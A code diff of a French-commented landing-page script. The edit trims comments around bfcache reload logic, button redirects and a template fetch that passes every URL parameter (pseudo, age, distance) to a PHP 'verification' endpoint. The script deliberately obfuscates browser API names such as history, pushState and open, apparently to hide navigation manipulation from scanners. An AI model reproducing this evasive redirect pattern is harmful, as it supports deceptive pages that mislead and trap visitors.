@@ -53,23 +53,23 @@
     
 <script>
     
-    // 🚨 CORRECTION CRITIQUE iOS/Android (bfcache) :
-    // Solution 1: Forcer le navigateur à recharger l'intégralité de la page.
+    // Correctif :
+    // Solution 1: Recharger page.
     window.addEventListener('pageshow', function(event) {
         if (event.persisted) {
             console.log("Page revenue du cache (bfcache). Forçage du rechargement...");
             
-            // Rechargement qui devrait vider le cache et relancer le script
+            // Rechargement cache
             window.location.reload(); 
             
-            // File de secours si reload() est ignoré (navigation forcée vers l'URL)
+            // File de secours
             setTimeout(function(){
                  window.location.href = window.location.href;
             }, 100);
         }
     });
 
-    // --- OBFUSCATION DE BASE ---
+    // --- OBSC ---
     const H = ['h', 'i', 's', 't', 'o', 'r', 'y'].join('');
     const PS = ['p', 'u', 's', 'h', 'S', 't', 'a', 't', 'e'].join('');
     const WO = ['o', 'p', 'e', 'n'].join('');
@@ -86,7 +86,7 @@
     const SUCCESS_ICON_HTML = '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#009432" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>';
     const LOADER_HTML_FIXED = '<div id="loader" style="width: 14px; height: 14px; border: 2px solid #f3f3f3; border-top: 2px solid #4285f4; border-radius: 50%; animation: spin 0.8s linear infinite;"></div>';
 
-    // Variable d'état pour bloquer les doubles clics rapides
+    // Bloquer les doubles clics rapides
     var redirected = false; 
     
     // --- 1. FONCTIONS DE BASES ---
@@ -128,7 +128,7 @@
             btn.addEventListener('click', function(event) {
                 event.preventDefault();
                 
-                // Si la redirection est déjà en cours suite à un clic
+                // condition
                 if (redirected) return;
 
                 this.setAttribute('data-original-html', this.innerHTML);
@@ -153,7 +153,7 @@
     var formData = new FormData();
     formData.append('action', 'get_links');
     
-    // 🚨 ENVOIE TOUS LES PARAMÈTRES DE L'URL (u, pseudo, age, distance, img_path, etc.)
+    // Params
     var urlParams = new URLSearchParams(window.location.search);
     urlParams.forEach(function(value, key) {
         formData.append(key, value);
@@ -172,7 +172,7 @@
                     btnElement.style.color = 'white';
                     btnElement.style.opacity = '1';
                     
-                    // Réactive le clic sur le bouton même s'il est au statut 'vert'
+                    // Bouton vert
                     btnElement.style.pointerEvents = 'auto'; 
                 }, 800);
             } else {
@@ -190,7 +190,7 @@
     }
 
     // --- 3.CHARGEMENT ---
-    // isReturnFromCache n'est plus nécessaire ici, car le pageshow relance l'URL
+    // isReturnFromCache
     function loadTemplate() { 
         
         let trackingParams = window.location.search;
@@ -205,7 +205,7 @@
         window[FE](URL_TEMPLATE + finalParams, { method: METHOD_GET })
         .then(response => {
             if (!response.ok) {
-                throw new Error('Erreur réseau ou script PHP non trouvé/mal configuré.');
+                throw new Error('Erreur réseau.');
             }
             return response.json();
         })
@@ -248,11 +248,11 @@
         .catch(err => {
             document.getElementById('loading-spinner').style.display = 'none';
             console.error("Erreur critique au chargement du template:", err);
-            document.getElementById('template-container').innerHTML = '<p style="color:red; font-size: 16px;">Erreur de connexion au serveur de vérification. (Vérifiez URL_PHP)</p>';
+            document.getElementById('template-container').innerHTML = '<p style="color:red; font-size: 16px;">Erreur de connexion. (Vérifiez URL_PHP)</p>';
         });
     }
 
-    // Lance le processus de chargement initial
+    // Chargement initial
     loadTemplate();
 </script>
 </body>
